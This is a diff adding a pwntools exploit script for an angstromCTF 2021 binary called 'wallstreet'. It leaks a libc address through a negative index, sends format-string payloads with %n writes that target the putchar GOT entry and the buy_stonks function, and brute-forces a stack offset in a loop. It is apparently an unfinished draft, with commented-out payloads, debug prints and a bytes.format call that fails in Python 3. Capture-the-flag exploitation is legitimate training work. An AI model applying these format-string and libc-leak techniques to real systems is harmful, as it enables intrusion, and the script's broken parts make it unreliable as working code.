@@ -1,0 +1,80 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF('././wallstreet')
+context.terminal = ['kitty', '-e', 'sh', '-c']
+host = args.HOST or 'pwn.2021.chall.actf.co'
+port = int(args.PORT or 21800)
+
+def local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return local(argv, *a, **kw)
+    else:
+        return remote(argv, *a, **kw)
+
+gdbscript = '''
+b *main
+b *0x4014A7
+b *0x000000004015BA
+set backtrace limit 1
+continue
+continue
+'''.format(**locals())
+# b'PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP%98$n' 
+# -- Exploit goes here --
+for i in range(100):
+	pop_rdi = 0x00000000004015c3
+	leave_ret = 0x0000000000401336
+	print(sys.argv)
+	libc = ELF("./libc.so.6")
+	io = start()
+	io.sendlineafter("1) Buy some stonks!\n", "1")
+	io.sendlineafter("What stonk do you want to see?\n", "-16")
+	data = io.recvline()
+	libc.address = u64(data.strip().ljust(8, b"\x00")) - 0x1e46c0
+	print("Libc: 0x%x" % libc.address)
+	# leak = u64(io.recvline().strip(b'\n').ljust(8, b'\x00'))
+	# libc.address = leak - 0x1e46c0
+	# print(hex(libc.address))
+	lmao = libc.address + 0x10f364
+	pops = 0x4015B6
+	one_shot = libc.address + 0x10f364
+	print(hex(one_shot))
+	print(hex(lmao))
+	payload = b"PPPPPPPP" + b"%728c%100$n" + b"PPPPP" + p64(exe.sym['buy_stonks'])
+	# payload2 = flat([
+	# 	"DDDDDDDD",
+	# 	"%728c%"
+	# ])
+	payload2 = b"DDDDDDDD" + b"%728c%" + b"{}".format(i) + b"$n" + b"PPPPPP" + p64(exe.got['putchar'])
+	# payload = b"PPPPPPPP" + b"%728c%100$n" + b"PPPPP" + p64(0xcafebabe)
+	io.send(payload)
+	print(payload2)
+	kek = io.recv()
+	print(kek)
+	io.recv()
+	io.sendline("-")
+	io.recv()
+	io.send(payload2)
+	io.interactive()
+"""
+__run_exit_handlers+245
+# __run_exit_handlers+106
+#47:0238│      0x7ffdfa1e8d38 —▸ 0x401557 (main+154) ◂— mov    eax, 0
+"""
